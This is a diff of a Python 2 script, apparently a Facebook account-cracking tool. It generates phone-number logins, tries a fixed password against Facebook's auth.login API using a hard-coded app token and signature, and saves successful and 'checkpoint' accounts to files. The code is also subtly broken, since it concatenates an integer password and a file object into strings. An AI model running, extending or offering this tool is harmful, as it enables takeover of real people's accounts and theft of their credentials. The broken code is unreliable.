@@ -88,6 +88,15 @@ def login():
 		keluar()
 
 
+	xxx = str(len(id))
+	print ('\033[1;96m[✓] \033[1;93mTotal Nomor: \033[97m'+xxx)
+	time.sleep(0.1)
+	pass2 = raw_input("\033[1;96m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print 42*"\033[1;96m="
+	print "\033[96m| 😎 | " + 3*" " + "\033[35mNOMOR HP" + 4*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
+	print 42*"\033[1;96m="
+
 def main(arg):
 	global cpb,oks
 	user = arg
@@ -98,19 +107,19 @@ def main(arg):
 	try:
 		pass1 = 786786
 		code = open('cod', 'a')
-		data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+		data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 		q = json.load(data)
 		if 'access_token' in q:
-			print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
+			print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 + code
 			okb = open('save/successfull.txt', 'a')
-			okb.write(user+'|'+pass1+code+'\n')
+			okb.write(k+c+user+'|'+pass1+code+'\n')
 			okb.close()
 			oks.append(user+pass1+code)
 		else:
 			if 'www.facebook.com' in q['error_msg']:
-				print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
+				print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 + code
 				cps = open('save/checkpoint.txt', 'a')
-				cps.write(user+'|'+pass1+code+'\n')
+				cps.write(k+c+user+'|'+pass1+code+'\n')
 				cps.close()
 				cpb.append(user+pass1+code)
 
